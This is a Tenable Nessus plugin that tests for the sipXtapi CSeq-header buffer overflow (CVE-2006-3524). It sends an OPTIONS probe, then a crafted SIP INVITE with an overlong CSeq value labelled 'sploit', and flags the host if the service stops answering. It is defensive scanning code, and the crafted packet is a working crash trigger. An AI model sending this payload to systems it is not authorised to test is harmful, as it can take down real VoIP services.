#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(22092);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-3524");
  script_bugtraq_id(18906);
  script_xref(name:"OSVDB", value:"27122");

  script_name(english:"sipXtapi INVITE Message CSeq Field Header Remote Overflow");
  script_summary(english:"Sends an SIP packet with a bad CSeq field");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host contains an application that is vulnerable to a remote
buffer overflow attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a SIP user agent that appears to be
compiled using a version of SIP Foundry's SipXtapi library before
March 24, 2006.  Such versions contain a buffer overflow flaw that is
triggered when processing a specially-crafted packet with a long value
for the 'CSeq' field.  A remote attacker may be able to exploit this
issue to execute arbitrary code on the affected host subject to the
privileges of the current user." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439617/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2006-07/0160.html" );
 script_set_attribute(attribute:"solution", value:
"Contact the software vendor to see if an upgrade is available." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"Misc.");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("sip_detection.nasl");
  script_require_keys("Services/udp/sip");

  exit(0);
}

port = get_kb_item("Services/udp/sip");
if (!port) port = 5060;


function sip_sendrecv(req)
{
  local_var res, soc;
  global_var port;

  if (isnull(req)) return NULL;

  if (islocalhost()) soc = open_sock_udp(port);
  else soc = open_priv_sock_udp(sport:5060, dport:port);
  if (!soc) return NULL;

  send(socket:soc, data:req);
  res = recv(socket:soc, length:1024);
  close(soc);

  return res;
}


# Make sure the service is up.
#
# nb: this is what's used in sip_detection.nasl.
probe = string(
  "OPTIONS sip:", get_host_name(), " SIP/2.0", "\r\n",
  "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
  "Max-Forwards: 70\r\n",
  "To: <sip:", this_host(), ":", port, ">\r\n",
  "From: Nessus <sip:", this_host(), ":", port, ">\r\n",
  "Call-ID: ", rand(), "\r\n",
  "CSeq: 63104 OPTIONS\r\n",
  "Contact: <sip:", this_host(), ">\r\n",
  "Accept: application/sdp\r\n",
  "Content-Length: 0\r\n",
  "\r\n"
);
if (isnull(sip_sendrecv(req:probe))) exit(0);


# Try to crash the service.
sploit = string(
  "INVITE sip:user@", get_host_name(), " SIP/2.0", "\r\n",
  "To: <sip:", this_host(), ":", port, ">\r\n",
  "Via: SIP/2.0/UDP ", this_host(), ":", port, "\r\n",
  "From: Nessus <sip:", this_host(), ":", port, ">\r\n",
  "Call-ID: ", rand(), "\r\n",
  "CSeq: 115792089237316195423570AAAA\r\n",
  "Max-Forwards: 70\r\n",
  "Contact: <sip:", this_host(), ">\r\n",
  "\r\n"
);
if (isnull(sip_sendrecv(req:sploit)))
{
  # There's a problem if the service is down now.
  if (isnull(sip_sendrecv(req:probe)))
    security_hole(port:port, proto:"udp");
}
